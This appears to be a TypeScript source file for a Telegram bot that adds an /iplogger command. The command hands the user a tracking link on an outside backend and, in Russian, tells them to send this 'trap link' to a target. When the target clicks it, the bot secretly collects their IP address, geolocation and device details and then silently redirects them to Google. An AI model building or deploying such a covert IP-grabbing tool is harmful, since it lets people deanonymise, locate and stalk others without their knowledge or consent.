import { Bot } from "grammy";

export function setupIpLogger(bot: Bot) {
  bot.command("iplogger", async (ctx) => {
    const chatId = ctx.chat.id;
    // URL backend appleta
    const baseUrl = "https://ais-dev-ksm5jkv5h246kcdmj7zddl-783580602421.europe-west2.run.app"; // Fallback if no specific route 
    const trackLink = `${baseUrl}/l/${chatId}`;
    
    await ctx.reply(`🔗 <b>Ваша ссылка-ловушка для перехвата IP:</b>\n\n<code>${trackLink}</code>\n\n<i>Отправьте эту ссылку цели. Как только она перейдет по ней (один клик), бот мгновенно пришлет вам её IP-адрес, гео-локацию и данные устройства, после чего цель незаметно перекинет на страницу по умолчанию (Google).</i>`, { parse_mode: "HTML" });
  });
}
